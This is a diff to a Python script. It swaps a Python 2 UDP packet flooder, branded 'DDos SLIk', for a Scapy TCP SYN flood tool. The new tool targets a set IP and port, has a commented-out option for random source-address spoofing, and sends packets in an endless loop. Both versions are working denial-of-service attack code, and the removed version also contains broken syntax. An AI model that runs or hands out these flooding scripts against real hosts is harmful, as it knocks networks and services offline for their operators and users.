@@ -1,61 +1,26 @@
-import sys
-import os
-import time
-import socket
-import random
+from scapy.all import *
 
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
+# target IP address (should be a testing router/firewall)
 
-minute = now.minute
+target_ip = "192.168.1.1"
 
-day = now.day
+# the target port u want to flood
 
-month = now.month
-year = now.year
+target_port = 80
 
+# forge IP packet with target ip as the destination IP address
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+ip = IP(dst=target_ip)
 
-bytes = random._urandom(1490)
-os.system("clear")
-os.system("figlet DDos SLIk")
-
-print "git hub       》      https://github.com/SLIK-ROAD   "
-print "ID rubika   》       @painllses"
-
-
-ip = raw_input("IP Target : ")
-
-port = input("Port : ")
-
-os.system("clear")
-os.system("figlet Attack SLIK")
-
-
-print "Loading…"
-time.sleep(5)
-print10%
-██▒▒▒▒▒▒▒
-time.sleep(5)
-print30%
-█████▒▒▒▒▒
-
-time.sleep(5)
-
-print"100%
-██████████   
-time.sleep(3)
-
-
-
-
-sent = 0
-while True:
-	sock.sendto(bytes, (ip,port))
-	sent = sent + 1
-	sent = sent + 1
-	print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-	if port == 65534:
-		port = 1   
+# or if you want to perform IP Spoofing (will work as well)
+# ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
+# forge a TCP SYN packet with a random source port
+# and the target port as the destination port
+tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
+# add some flooding data (1KB in this case, don't increase it too much, 
+# otherwise, it won't work.)
+raw = Raw(b"X"*1024)
+# stack up the layers
+p = ip / tcp / raw
+# send the constructed packet in a loop until CTRL+C is detected 
+send(p, loop=1, verbose=0)
